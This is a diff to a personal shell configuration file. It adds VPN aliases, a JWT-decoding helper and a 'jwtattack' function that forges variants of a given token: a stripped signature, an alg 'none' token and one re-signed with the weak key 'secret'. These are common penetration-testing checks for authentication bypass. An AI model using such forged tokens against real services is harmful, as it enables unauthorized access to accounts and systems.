@@ -67,6 +67,9 @@ alias wget="wget -c"    # continue download
 alias docker="sudo docker"
 alias td="tr -d '\n'"
 
+alias vpnon="nmcli connection up wg0"
+alias vpnoff="nmcli connection down wg0"
+
 # Use neovim then vim (if available)
 if [ -x "$(command -v nvim)" ]; then
   alias vi="nvim"
@@ -192,6 +195,16 @@ dockshell() {
     fi
 
     sudo docker run -v "${PWD}":"${PWD}" -w "${PWD}" -it "${IMAGE}"
+}
+
+jwtdecode() {
+  echo -n $@ | python3 -c 'import jwt;import sys; e=sys.stdin.read();print("Header: ",jwt.get_unverified_header(e));print("Body: ",jwt.decode(e, options={"verify_signature": False}))'
+}
+
+jwtattack() {
+echo -n $@ | python3 -c 'import jwt;import sys; e=sys.stdin.read();print("Null Signature: ",e[:e.rindex(".''")+1])'
+echo -n $@ | python3 -c 'import jwt;import sys; e=sys.stdin.read();j=jwt.decode(e,options={"verify_signature":False});h=jwt.get_unverified_header(e);h.pop("alg");print("None algoritm: ",jwt.encode(j, key="", algorithm="none",headers=h))'
+echo -n $@ | python3 -c 'import jwt;import sys; e=sys.stdin.read();j=jwt.decode(e,options={"verify_signature":False});h=jwt.get_unverified_header(e);h.pop("alg");print("Secret key HS256: ",jwt.encode(j, key="secret", algorithm="HS256",headers=h))'
 }
 
 ######
